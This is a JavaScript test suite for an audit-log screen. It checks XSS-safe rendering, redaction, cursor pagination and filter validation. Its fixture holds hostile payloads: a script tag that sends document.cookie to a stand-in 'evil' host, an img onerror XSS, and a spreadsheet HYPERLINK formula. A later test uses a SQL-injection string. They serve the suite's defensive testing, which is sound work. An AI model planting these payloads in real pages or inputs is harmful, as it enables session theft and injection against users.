/**
 * audit.js — the named XSS threat, proven through the real screen:
 * hostile audit payloads render as inert JSON TEXT; redacted entries
 * disclose nothing; pagination is cursor-only; filters validate.
 */
import { test, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';

import {
  allTextData,
  buttonByText,
  FakeElement,
  findAll,
  flush,
  installDom,
} from './helpers/fakedom.mjs';
import { clearSession, setActiveTenantId, setPermissions, setTokens } from '../src/session.js';
import { mountAudit } from '../src/audit.js';
import { prettyJson } from '../src/format.js';

const HOSTILE_PAYLOAD = {
  full_name: '<script>fetch("//evil?c="+document.cookie)</script>',
  branch: '<img src=x onerror=alert(1)>',
  note: '=HYPERLINK("http://evil","x")',
};

const ENTRIES = [
  {
    id: 42,
    at: '2026-07-29T10:00:00+00:00',
    actor_id: '99999999-9999-9999-9999-999999999999',
    action: 'user.update',
    entity: 'users',
    entity_id: '55555555-5555-5555-5555-555555555555',
    before: HOSTILE_PAYLOAD,
    after: { full_name: 'clean' },
    redacted: false,
  },
  {
    id: 41,
    at: '2026-07-29T09:00:00+00:00',
    actor_id: null,
    action: 'loan.disburse',
    entity: 'loans',
    entity_id: 'LN-1',
    before: null,
    after: null,
    redacted: true,
  },
];

function seg(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

/** @type {() => void} */
let restoreDom;
/** @type {string[]} */
let urls;
const realFetch = globalThis.fetch;

function jsonRes(status, body) {
  return { ok: status >= 200 && status < 300, status, headers: { get: () => null }, json: async () => body };
}

/** @param {string|null} nextCursor */
function route(nextCursor = null) {
  // @ts-expect-error test double
  globalThis.fetch = async (url) => {
    urls.push(String(url));
    return jsonRes(200, { items: ENTRIES, next_cursor: nextCursor });
  };
}

function mount() {
  const container = new FakeElement('main');
  const modalHost = new FakeElement('div');
  mountAudit(container, { onSessionExpired: () => {}, modalHost });
  return { container, modalHost };
}

beforeEach(() => {
  restoreDom = installDom();
  urls = [];
  clearSession();
  setTokens(`${seg({ alg: 'HS256' })}.${seg({ sub: 'u' })}.s`, 'r1');
  setActiveTenantId('22222222-2222-2222-2222-222222222222');
  setPermissions([
    { module: 'access_control', can_view: true, can_create: false, can_edit: false, can_approve: false },
  ]);
});
afterEach(() => {
  restoreDom();
  globalThis.fetch = realFetch;
  clearSession();
});

test('hostile audit payload renders as inert JSON text — the named threat', async () => {
  route();
  const { container, modalHost } = mount();
  await flush();
  const rows = findAll(container, (n) => n.tagName === 'TR' && (n.attrs.class ?? '').includes('rowbtn'));
  assert.equal(rows.length, 2);
  rows[0].dispatch('click');
  await flush();
  // The <pre> holds EXACTLY the API's payload, pretty-printed, as ONE
  // text node — byte-identical, unparsed (fake DOM throws on parser
  // sinks, so reaching here proves no interpretation happened).
  const pres = findAll(modalHost, (n) => n.tagName === 'PRE');
  assert.equal(pres.length, 2, 'before + after blocks');
  assert.equal(pres[0].textContent, prettyJson(HOSTILE_PAYLOAD));
  assert.ok(pres[0].textContent.includes('<script>'), 'script tag present as character data');
});

test('redacted entries disclose no payload and no reconstruction', async () => {
  route();
  const { container, modalHost } = mount();
  await flush();
  const rows = findAll(container, (n) => n.tagName === 'TR' && (n.attrs.class ?? '').includes('rowbtn'));
  rows[1].dispatch('click');
  await flush();
  assert.equal(findAll(modalHost, (n) => n.tagName === 'PRE').length, 0, 'no payload blocks');
  const text = allTextData(modalHost).join(' ');
  assert.ok(text.includes('Redacted per role entitlement.'));
  assert.ok(text.includes('system'), 'null actor renders as system');
  // Falsifiable no-reconstruction oracle: nothing from any payload key
  // may appear for a redacted row.
  assert.ok(!text.includes('full_name'));
});

test('pagination is keyset-only: Next echoes the opaque cursor, no page numbers', async () => {
  route('OPAQUE|CURSOR+1');
  const { container } = mount();
  await flush();
  assert.match(urls[0], /^\/audit-log\?/);
  assert.ok(!urls[0].includes('offset'), 'never offset pagination');
  const next = buttonByText(container, 'Next ›');
  assert.equal(next.disabled, false);
  next.dispatch('click');
  await flush();
  const q = new URL(`http://x${urls[1]}`).searchParams;
  assert.equal(q.get('cursor'), 'OPAQUE|CURSOR+1', 'cursor round-trips byte-identical');
  assert.equal(q.get('limit'), '20');
});

test('actor filter must be a UUID before any request leaves the client', async () => {
  route();
  const { container } = mount();
  await flush();
  const before = urls.length;
  const actorInput = findAll(container, (n) => n.tagName === 'INPUT' && n.attrs.placeholder === 'actor UUID')[0];
  actorInput.value = "' OR 1=1 --";
  buttonByText(container, 'Apply filters').dispatch('click');
  await flush();
  assert.equal(urls.length, before, 'no request sent for an invalid actor filter');
  const err = allTextData(container).join(' ');
  assert.ok(err.includes('Actor filter must be a UUID.'));
});

test('valid filters reach the API as bound query parameters', async () => {
  route();
  const { container } = mount();
  await flush();
  const inputs = findAll(container, (n) => n.tagName === 'INPUT');
  const byPlaceholder = (p) => inputs.find((n) => n.attrs.placeholder === p);
  byPlaceholder('e.g. users').value = 'users';
  byPlaceholder('e.g. user.role').value = 'user.role';
  byPlaceholder('actor UUID').value = '99999999-9999-9999-9999-999999999999';
  buttonByText(container, 'Apply filters').dispatch('click');
  await flush();
  const q = new URL(`http://x${urls[urls.length - 1]}`).searchParams;
  assert.equal(q.get('entity'), 'users');
  assert.equal(q.get('action'), 'user.role');
  assert.equal(q.get('actor_id'), '99999999-9999-9999-9999-999999999999');
  assert.equal(q.get('cursor'), null, 'filter change resets to the first page');
});
